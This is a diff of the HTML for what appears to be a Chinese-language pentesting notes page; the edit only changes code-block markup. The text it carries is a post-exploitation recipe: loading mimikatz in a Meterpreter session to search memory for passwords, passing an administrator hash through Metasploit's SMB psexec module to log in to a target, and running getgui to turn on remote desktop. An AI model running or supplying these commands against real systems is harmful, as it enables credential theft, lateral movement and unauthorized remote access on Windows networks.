@@ -39,7 +39,7 @@
       
       <p>获取metepreter之后，可以</p>
 <p><a href="https://www.offensive-security.com/metasploit-unleashed/mimikatz/">https://www.offensive-security.com/metasploit-unleashed/mimikatz/</a></p>
-<div class="highlight"><pre><span></span><span class="err">加载</span><span class="n">mimikata模块</span><span class="o">:</span>
+<div class="highlight"><pre><span></span><code><span class="err">加载</span><span class="n">mimikata模块</span><span class="o">:</span>
 <span class="n">load</span> <span class="n">mimikatz</span>    
 
 <span class="err">查看帮助</span><span class="o">:</span>
@@ -57,17 +57,17 @@
 
 <span class="n">mimikatz_command</span> <span class="o">-</span><span class="n">f</span> <span class="n">handle</span><span class="o">::</span><span class="n">list</span>  <span class="n">msf查看超时</span>
  <span class="n">mimikatz_command</span> <span class="o">-</span><span class="n">f</span> <span class="n">sekurlsa</span><span class="o">::</span><span class="n">searchPasswords</span>
-</pre></div>
+</code></pre></div>
 
 
 <p>知道hash不能破解密码情况下可以这样: 445要开启</p>
-<div class="highlight"><pre><span></span><span class="nv">use</span> <span class="nv">exploit</span><span class="o">/</span><span class="nv">windows</span><span class="o">/</span><span class="nv">smb</span><span class="o">/</span><span class="nv">psexec</span>
-<span class="k">show</span> <span class="nv">options</span>
-<span class="nv">set</span> <span class="nv">rhost</span> <span class="nv">x</span>.<span class="nv">x</span>.<span class="nv">x</span>.<span class="nv">x</span>
-<span class="nv">set</span> <span class="nv">smbpass</span>  <span class="nv">hash</span>数值
-<span class="nv">set</span> <span class="nv">smbuser</span> <span class="nv">administrator</span>
-<span class="nv">run</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="err">use exploit/windows/smb/psexec</span>
+<span class="err">show options</span>
+<span class="err">set rhost x.x.x.x</span>
+<span class="err">set smbpass  hash数值</span>
+<span class="err">set smbuser administrator</span>
+<span class="err">run</span>
+</code></pre></div>
 
 
 <p>run getgui -e  打开rdp</p>
